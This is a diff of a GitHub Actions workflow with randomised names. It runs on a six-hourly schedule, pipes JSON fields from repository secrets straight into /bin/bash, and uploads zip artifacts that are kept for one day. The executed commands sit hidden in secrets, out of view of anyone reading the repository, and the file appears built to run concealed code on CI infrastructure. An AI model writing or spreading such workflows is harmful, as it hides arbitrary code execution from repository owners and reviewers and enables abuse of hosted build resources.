@@ -1,24 +1,25 @@
 name: kuanlvlihong
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '16 0/6 * * *'
-jobs:  # 2615
+    - cron: '2 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kuanlvlihong
         env:
-          qyce199: ${{ secrets.qyce199 }}
+          sfq171: ${{ secrets.sfq171 }}
         run: |
-          echo $qyce199 | jq -r .iyyuo3 | /bin/bash
-          echo $s17 | jq -r .avryc2542 | /bin/bash
-          echo $gsnc9 | jq -r .gtfmu798 | /bin/bash
-          echo $gb7940 | jq -r .klqf93078 | /bin/bash
-          echo $rduo41 | jq -r .lfw68 | /bin/bash
-          echo $eswf1767 | jq -r .e5282 | /bin/bash
-          echo $q82 | jq -r .vvt08625 | /bin/bash
-          echo $qbheu5 | jq -r .npo5 | /bin/bash
+          printf '%s' "$sfq171" | jq -r .kj4 | /bin/bash
+          echo $soq9784 | jq -r .htlb6 | /bin/bash
+          printf '%s' "$ootus2682" | jq -r .abz737 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ndIFBq4E
+          path: "*.zip"
+          retention-days: 1
